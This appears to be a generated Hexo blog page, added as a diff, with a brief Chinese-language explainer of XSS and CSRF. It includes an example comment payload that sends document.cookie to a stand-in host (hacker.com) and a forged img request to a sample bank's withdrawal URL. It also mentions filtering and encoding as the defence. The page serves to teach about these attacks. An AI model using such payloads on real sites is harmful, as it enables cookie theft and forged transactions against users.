@@ -1,0 +1,149 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="chrome=1">
+  
+  <title>XSS CSRF | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  
+    <meta name="author" content="John Doe">
+  
+  
+    <meta name="description" content="XSS
+参考https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC
+
+跨网站脚本（Cross-site scripting，通常简称为XSS或跨站脚本或跨站脚本攻击）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。">
+  
+  <meta name="description" content="XSS
+参考https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC
+
+跨网站脚本（Cross-site scripting，通常简称为XSS或跨站脚本或跨站脚本攻击）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS CSRF">
+<meta property="og:url" content="http://yoursite.com/2015/08/16/xss_csrf/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="XSS
+参考https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC
+
+跨网站脚本（Cross-site scripting，通常简称为XSS或跨站脚本或跨站脚本攻击）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。">
+<meta property="og:updated_time" content="2015-08-16T06:22:02.242Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="XSS CSRF">
+<meta name="twitter:description" content="XSS
+参考https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC
+
+跨网站脚本（Cross-site scripting，通常简称为XSS或跨站脚本或跨站脚本攻击）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" type="image/x-icon" href="/favicon.ico">
+  
+  <link rel="stylesheet" href="/css/style.css" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  
+</head>
+
+<body>
+  <div class="wrapper">
+    <header id="header">
+  <div class="title">
+    <h1><a href="/">Hexo</a></h1>
+    <p><a href="/"></a></p>
+  </div>
+  <nav class="nav">
+    <ul>
+      
+        <li><a href="/">Home</a></li>
+      
+        <li><a href="/archives">Archives</a></li>
+      
+      
+        <li><a href="/atom.xml">RSS</a></li>
+      
+    </ul>
+    <div class="clearfix"></div>
+  </nav>
+  <div class="clearfix"></div>
+</header>
+    <div class="content"><article class="post">
+  <header>
+    
+      <div class="icon"></div>
+      <a href="/2015/08/16/xss_csrf/">
+  <time datetime="2015-08-16T13:03:51.612Z">
+    2015-08-16
+  </time>
+</a>
+    
+    
+  
+    <h1 class="title">XSS CSRF</h1>
+  
+
+  </header>
+  
+  <div class="entry">
+    
+      <h1 id="XSS">XSS</h1><blockquote>
+<p>参考<br><a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC" target="_blank" rel="external">https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC</a></p>
+</blockquote>
+<p>跨网站脚本（Cross-site scripting，通常简称为XSS或跨站脚本或跨站脚本攻击）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。</p>
+<h3 id="恶意代码是什么样子的?">恶意代码是什么样子的?</h3><p>例如有人在评论中输入了<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="tag">img</span> src=<span class="string">"http://www.hacker.com/xss/hacker.php?cookie=document.cookie"</span> &gt;</span><br></pre></td></tr></table></figure></p>
+<p>而有人浏览到了这个评论, 那么浏览器就会加载这个图片(发了请求), 那么他的Cookie就被发送出去了</p>
+<h3 id="怎么做">怎么做</h3><p>通常是对用户输入和服务器输出到浏览器的数据进行检查，把一些敏感字符和特殊字符进行过滤或者编码。而对XSS漏洞进行防御。</p>
+<h1 id="CSRF">CSRF</h1><blockquote>
+<p>参考<br><a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0" target="_blank" rel="external">https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0</a><br><a href="http://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html" target="_blank" rel="external">http://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html</a></p>
+</blockquote>
+<p>跨站请求伪造（英语：Cross-site request forgery）<br>跟跨网站脚本（XSS）相比，XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。</p>
+<p>你这可以这么理解CSRF攻击：攻击者盗用了你的身份，以你的名义发送恶意请求</p>
+<p>维基百科例子很明了<br>假如一家银行用以执行转账操作的URL地址如下： <a href="http://www.examplebank.com/withdraw?account=AccoutName&amp;amount=1000&amp;for=PayeeName" target="_blank" rel="external">http://www.examplebank.com/withdraw?account=AccoutName&amp;amount=1000&amp;for=PayeeName</a></p>
+<p>如果有账户名为Alice的用户访问了恶意站点，而这个恶意站点有这样的一个请求<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="tag">img</span> src=<span class="string">"http://www.examplebank.com/withdraw?account=Alice&amp;amount=1000&amp;for=Badman"</span>&gt;</span><br></pre></td></tr></table></figure></p>
+<p>而她之前刚访问过银行不久，登录信息尚未过期，那么她就会损失1000资金。<br>(因为这个恶意站点上有一个请求时发往examplebank 的  浏览器会把用户examplebank的Cookie一起发过去)</p>
+<h3 id="Cookie跨域访问">Cookie跨域访问</h3><blockquote>
+<p>参考<br><a href="http://www.cnblogs.com/waters/articles/2869855.html" target="_blank" rel="external">http://www.cnblogs.com/waters/articles/2869855.html</a><br>总的来说通过一些非常规的方式,  是可以做到b.com访问a.com下面的Cookie</p>
+</blockquote>
+
+    
+  </div>
+  <footer>
+    
+      
+      
+    
+    <div class="clearfix"></div>
+  </footer>
+</article>
+
+</div>
+  </div>
+  <footer id="footer"><div class="copyright">
+  
+  &copy; 2015 <a href="/">John Doe</a>
+  
+</div>
+<div class="theme-copyright">
+  Theme by <a href="https://github.com/orderedlist" target="_blank">orderedlist</a>
+   | 
+  Redesign by <a href="http://heroicyang.com/" target="_blank">Heroic Yang</a>
+</div>
+<div class="clearfix"></div></footer>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.8/jquery.min.js"></script>
+<script src="/js/scale.fix.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+  (function($){
+    $('.fancybox').fancybox();
+  })(jQuery);
+</script>
+
+</body>
+</html>
